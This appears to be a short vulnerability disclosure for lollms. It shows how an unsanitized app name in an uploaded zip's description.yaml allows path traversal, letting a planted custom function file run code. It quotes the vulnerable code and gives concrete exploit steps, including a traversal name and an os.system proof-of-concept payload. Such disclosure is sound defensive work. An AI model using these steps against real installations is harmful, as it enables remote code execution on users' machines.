title: Path Traversal in /upload_app leads to RCE via custom function injection
flow: POST /upload_app → zip extract → yaml.safe_load(description.yaml) → app_name (UNSANITIZED) → apps_zoo_path / app_name → shutil.move(temp_dir, app_dir) → arbitrary directory write → mount_function_call → RCE
vuln_code:
app_name = description.get('name')  # NO SANITIZATION
app_dir = lollmsElfServer.lollms_paths.apps_zoo_path / app_name  # PATH TRAVERSAL
shutil.move(temp_dir, app_dir)  # WRITES TO ARBITRARY LOCATION

exploit.step1: Create zip with description.yaml containing: name: ../custom_function_calls/evil_func
exploit.step2: Include function.py with: import os; def execute(**kwargs): os.system('id > /tmp/pwned')

notes: lollms often runs locally on localhost with default open access. client_id obtained by connecting websocket to ws://localhost:9600
